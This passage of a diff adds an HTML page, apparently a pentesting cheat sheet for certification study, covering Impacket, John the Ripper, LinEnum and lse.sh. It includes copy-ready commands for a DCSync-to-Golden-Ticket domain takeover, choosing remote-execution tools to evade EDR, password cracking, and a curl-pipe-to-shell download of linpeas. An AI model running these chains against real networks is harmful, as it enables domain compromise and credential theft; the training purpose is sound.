+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A full dump of every domain account's NTLM hash.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>The krbtgt hash specifically enables Golden Ticket forgery for long-term domain persistence — flag this as a critical, immediate-remediation finding.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Access denied means the account lacks Replicating Directory Changes rights — check BloodHound for which accounts actually hold DCSync privileges instead of assuming yours does.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Correct PAC/ticket inspection (replaces the nonexistent getPac.py)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>describeTicket.py ticket.ccache</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Parses a Kerberos ticket file and prints its PAC contents in human-readable form — SIDs, group memberships, and privilege data embedded in the ticket.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Group SID history and privilege attribute data that might reveal unexpected elevated group membership.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Cross-reference discovered SIDs against BloodHound's SID database to identify exactly which groups they map to.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Malformed or expired ticket — regenerate with getTGT.py or getST.py first.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>secretsdump.py</code></td><td>Dump SAM/LSA/NTDS.dit secrets, locally or remotely via DCSync.</td></tr>
+<tr><td class="opt-flag"><code>psexec.py / wmiexec.py / atexec.py</code></td><td>Three different remote command execution techniques, each using a different Windows service/mechanism — useful when one is blocked or monitored and another isn't.</td></tr>
+<tr><td class="opt-flag"><code>ntlmrelayx.py</code></td><td>NTLM relay attack tool, typically paired with Responder.</td></tr>
+<tr><td class="opt-flag"><code>ticketer.py</code></td><td>Forge Golden/Silver Kerberos tickets.</td></tr>
+<tr><td class="opt-flag"><code>getTGT.py / getST.py</code></td><td>Request and save TGTs / service tickets to a ccache file.</td></tr>
+<tr><td class="opt-flag"><code>describeTicket.py</code></td><td>Parse and display the contents of an existing ticket file.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Full DCSync-to-Golden-Ticket persistence chain</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>secretsdump.py -just-dc example.com/zak:zak123@$IP
+# extract krbtgt hash and domain SID from output, then:
+ticketer.py -nthash &lt;krbtgt_hash&gt; -domain-sid &lt;sid&gt; -domain example.com Administrator
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass example.com/Administrator@dc01.example.com</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>This is the canonical AD domain-dominance chain most CPTS/OSCP-style engagements ultimately build toward: dump the krbtgt hash via DCSync, forge a Golden Ticket for any account (including one that doesn't even need to exist), then use that forged ticket for Kerberos-authenticated command execution — demonstrating full, persistent domain compromise for the report.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Choosing between psexec / wmiexec / atexec based on what's being monitored</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code># psexec.py leaves a service artifact and a binary drop
+# wmiexec.py uses WMI, semi-fileless, more commonly allowed through firewalls
+# atexec.py uses the Task Scheduler service, generally the quietest of the three
+atexec.py example.com/zak:zak123@$IP 'whoami'</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Efficient testers don't default to psexec.py out of habit — each of the three execution methods creates different forensic artifacts and trips different detection rules, so picking based on what's specifically in scope (or what a client's EDR is known to flag) is standard practice on evasion-aware engagements.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Impacket scripts remain the backbone of nearly every AD attack chain in 2026 — NetExec, BloodHound collectors, and most custom tooling either call Impacket directly or reimplement its protocol logic. Fluency with the individual scripts (rather than relying solely on wrapper tools) is still what separates a tester who understands the underlying attack from one who's just running a menu option.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="john">
+      <div class="section-header">
+        <div class="section-number">18</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🔨</span>
+          <h2>John the Ripper</h2>
+          <span class="section-cat">Password Cracking</span>
+        </div>
+      </div>
+      <p class="section-tagline">The flexible, format-aware password cracker — still the right tool when hashcat's GPU speed isn't the deciding factor.</p>
+      <p class="section-overview">John's strength over hashcat isn't raw speed (hashcat wins that on GPU-friendly hash types) — it's
+ breadth of format auto-detection, the *2john family of pre-processing scripts that convert obscure file
+ formats into crackable hashes, and a more forgiving mask/rule syntax for CPU-based cracking. In practice most
+ testers keep both installed and pick based on hash type and available hardware.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All commands, rule syntax, and mode descriptions are accurate for current John the Ripper (Jumbo) builds.</li>
+<li>Worth clarifying: most current Kali installs ship 'John the Ripper Jumbo', a community-extended fork with far more format support and the full *2john script collection — the vanilla upstream John is comparatively bare.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Wordlist attack</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Compares every hash against every word in the list — the standard first attempt, since real-world passwords are disproportionately dictionary-based or close variants.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Terminal output announcing each cracked password as it's found.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Run <code>john --show hashes.txt</code> to see the full cracked list once the run finishes or is interrupted.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No hits — the hash format may not have been auto-detected correctly; specify it explicitly with --format.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Rule-based mutation attack</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>john --wordlist=rockyou.txt --rules=KoreLogic hashes.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Applies systematic mutations (capitalization, leetspeak substitutions, appended digits/years) to every wordlist entry, covering the enormous space of 'dictionary word + slight variation' passwords real users actually pick.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A meaningfully higher crack rate than the plain wordlist run.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>If KoreLogic doesn't yield much more, try the built-in 'best64' rule set (from hashcat, importable into John) for a different mutation strategy.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Password policy likely enforces enough complexity that simple mutations of dictionary words don't cover it — move to mask mode with a policy-informed pattern.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>--wordlist=&lt;file&gt;</code></td><td>Dictionary attack source.</td></tr>
+<tr><td class="opt-flag"><code>--rules=&lt;name&gt;</code></td><td>Apply a named mutation rule set.</td></tr>
+<tr><td class="opt-flag"><code>--mask=&lt;pattern&gt;</code></td><td>Targeted brute force with a character-class pattern.</td></tr>
+<tr><td class="opt-flag"><code>--show</code></td><td>Display already-cracked passwords.</td></tr>
+<tr><td class="opt-flag"><code>--format=&lt;type&gt;</code></td><td>Explicitly specify hash format when auto-detection fails.</td></tr>
+<tr><td class="opt-flag"><code>--session=&lt;name&gt; / --restore</code></td><td>Save and resume long-running cracking sessions.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Building a targeted mask from a known password policy</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>john --mask='?u?l?l?l?l?l?l?d?d' hashes.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Once you know a client's password policy from a domain assessment (e.g. minimum 9 chars, 1 uppercase, ends in 2 digits — a genuinely common corporate pattern like 'Companyname26'), a mask targeting exactly that structure cracks the password space far faster than a generic wordlist+rules attack, because you're not wasting cycles on patterns the policy makes impossible.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Converting captured files with the *2john family</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>ssh2john.py id_rsa &gt; ssh_hash.txt
+zip2john protected.zip &gt; zip_hash.txt
+office2john.py document.docx &gt; office_hash.txt
+john ssh_hash.txt ssh_hash.txt zip_hash.txt office_hash.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>The *2john scripts are the real reason John stays relevant even in a hashcat-first shop: cracking a password-protected SSH key, ZIP, or Office document found on a share requires converting it to a hash format first, and John's ecosystem is by far the most complete for these conversions.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Efficient testers use John and hashcat together rather than picking one: John for its unmatched breadth of *2john format conversion and CPU-friendly flexible rule syntax, hashcat for raw GPU-accelerated speed on high-value hash types (NTLM, Kerberos tickets) where cracking millions of candidates per second actually matters.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="linenum">
+      <div class="section-header">
+        <div class="section-number">19</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🐧</span>
+          <h2>LinEnum.sh</h2>
+          <span class="section-cat">Linux Privilege Escalation</span>
+        </div>
+      </div>
+      <p class="section-tagline">An early, still-functional Linux enumeration script — largely superseded by linpeas.sh in current practice.</p>
+      <p class="section-overview">LinEnum was one of the original one-shot Linux privesc enumeration scripts, and the categories it
+ checks (kernel/OS version, SUID/SGID binaries, writable files, cron jobs, sudo rules) are still exactly the
+ right things to look at. What's changed is that its successor, linpeas.sh, checks a superset of the same
+ things with color-coded output that highlights likely-exploitable findings automatically, which is why it's
+ become the default choice on almost every current engagement.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All usage instructions and the 'key information to look for' list are accurate and remain good general privilege-escalation guidance regardless of which specific script you run.</li>
+<li><b>Market-reality note:</b> LinEnum has had minimal active development in recent years compared to <b>linpeas.sh</b> (part of the PEASS-ng suite), which checks a broader set of misconfigurations, includes color-coded severity highlighting (bright yellow/red flags likely-exploitable findings automatically instead of you having to read every line), and is updated far more frequently to catch newly disclosed privesc techniques. LinEnum is still fine to know and occasionally useful when linpeas is flagged/blocked by AV and a smaller, less signatured script is needed, but it shouldn't be your default choice in 2026.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Download and run</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh -t</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Runs a broad, one-shot sweep of common Linux privesc vectors so you don't have to manually check each category by hand.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>SUID/SGID binaries not in the standard baseline list, writable files owned by root, sudo -l output showing NOPASSWD entries.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Cross-reference any unusual SUID binary against GTFOBins for a known escalation technique.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Nothing obviously exploitable found — that's a real, valid outcome; move to manual checks of specific services/processes running as root.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-t</code></td><td>Thorough mode — additional checks.</td></tr>
+<tr><td class="opt-flag"><code>-e &lt;dir&gt;</code></td><td>Export a report to a specific directory.</td></tr>
+<tr><td class="opt-flag"><code>&gt; output.txt</code></td><td>Redirect full output to a file for offline review.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">The current, more common alternative (for direct comparison)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>This is what most current testers actually run instead — same core idea as LinEnum, but with a far more current and comprehensive check list plus automatic color-coded highlighting of the findings most likely to be directly exploitable, meaningfully cutting down triage time on a box with a lot of noisy output.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Know LinEnum because it's still in CPTS/OSCP course material and you'll see it referenced in older writeups, but default to linpeas.sh on real engagements — and keep LinEnum (or another lightweight alternative) in your back pocket specifically for cases where linpeas gets flagged by AV/EDR and you need a less-signatured fallback script.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="lse">
+      <div class="section-header">
+        <div class="section-number">20</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🔬</span>
+          <h2>lse.sh</h2>
+          <span class="section-cat">Linux Privilege Escalation</span>
+        </div>
+      </div>
+      <p class="section-tagline">Linux Smart Enumeration — actively maintained, verbosity-tiered, and genuinely still in regular use.</p>
+      <p class="section-overview">lse.sh's defining feature is its three-tier verbosity system: level 0 shows only the findings the
+ author considers highly likely to be directly exploitable, level 1 adds interesting-but-not-certain findings,
+ and level 2 dumps everything. That triage-by-default design is what keeps it in regular rotation alongside
+ linpeas rather than being fully replaced by it — less noise to wade through on a first pass.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All usage instructions, verbosity levels, and section names are accurate and current for the actively maintained lse.sh project.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Default run (highest-confidence findings only)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
+chmod +x lse.sh
+./lse.sh</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Runs at verbosity level 0 by default — shows only the findings the script's own heuristics rate as highly likely to be directly exploitable, which is a genuinely useful first triage pass on a box with a lot of noise.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Anything highlighted as a high-confidence finding (color-coded, typically red/orange).</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>If nothing obvious turns up at level 0, bump to level 1 before assuming the box is clean.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Clean level-0 run doesn't mean no path exists — it means no high-confidence one was found automatically; move to level 1/2 or manual inspection.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Higher verbosity</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>./lse.sh -l 1</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Surfaces medium-confidence findings the default run deliberately suppresses to reduce noise.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A noticeably longer output with more borderline/context-dependent findings.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Manually assess each medium-confidence item rather than assuming it's exploitable just because it's flagged.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Even level 2 (full dump) coming back clean is possible on a genuinely well-hardened box — that's a legitimate finding in itself for the report.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-l 0/1/2</code></td><td>Verbosity level: high-confidence only / interesting / everything.</td></tr>
+<tr><td class="opt-flag"><code>-i</code></td><td>Non-interactive mode (needed for unattended/scripted runs).</td></tr>
+<tr><td class="opt-flag"><code>-s &lt;sections&gt;</code></td><td>Run only specific sections, e.g. usr,sud,net.</td></tr>
+<tr><td class="opt-flag"><code>-c</code></td><td>Disable colored output (useful when redirecting to a file).</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Targeted section run after an initial full sweep</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>./lse.sh -i -l 2 -s sud,fst -c &gt; lse_sudo_and_filesystem.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Once an initial full run (or linpeas) has pointed you toward a specific category — sudo misconfigurations and filesystem permissions being the two most common real-world privesc vectors — re-running lse.sh scoped to just those sections at max verbosity, non-interactively, and saved to a color-free file makes for a clean piece of evidence to paste directly into the report.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>lse.sh remains genuinely popular alongside linpeas rather than being replaced by it — many testers run both, since lse's tiered-confidence output style catches some things faster on a first pass while linpeas's broader, more frequently updated check list catches more edge cases on a second pass.</p>
+      </div>
+    </section>
+
+    <footer class="app-footer">
+      <div>Master Tools Collection for Pentesting — Part 1 of N · built for <a href="#">cyberfox.in</a></div>
+      <div style="margin-top:6px;">Sources fact-checked and expanded against current (2026) tool behavior and real-world engagement workflows. Verify version-specific flags against your installed tool version before an engagement.</div>
+    </footer>
+  </main>
+</div>
+
+<a href="#top" class="back-top" id="backTop">&#8593;</a>
+
+<script>
+function copyCmd(btn) {
+  const pre = btn.closest('.cmd-card').querySelector('.cmd-pre code');
+  const text = pre.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    const orig = btn.textContent;
+    btn.textContent = 'copied';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = orig; btn.classList.remove('copied'); }, 1400);
+  });
+}
+
+// active nav highlighting
+const sections = document.querySelectorAll('.tool-section');
+const navLinks = document.querySelectorAll('.nav-link');
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    const id = entry.target.id;
+    const link = document.querySelector(`.nav-link[data-id="${id}"]`);
+    if (!link) return;
+    if (entry.isIntersecting) {
+      navLinks.forEach(l => l.classList.remove('active'));
+      link.classList.add('active');
+    }
+  });
+}, { rootMargin: '-15% 0px -70% 0px', threshold: 0 });
+sections.forEach(s => observer.observe(s));
+
+// nav search filter
+document.getElementById('navSearch').addEventListener('input', (e) => {
+  const q = e.target.value.toLowerCase();
+  navLinks.forEach(link => {
+    const text = link.querySelector('.nav-text').textContent.toLowerCase();
+    link.style.display = text.includes(q) ? 'flex' : 'none';
+  });
+});
+
+// back to top
+const backTop = document.getElementById('backTop');
+window.addEventListener('scroll', () => {
+  backTop.classList.toggle('show', window.scrollY > 600);
+});
+</script>
+</body>
+</html>
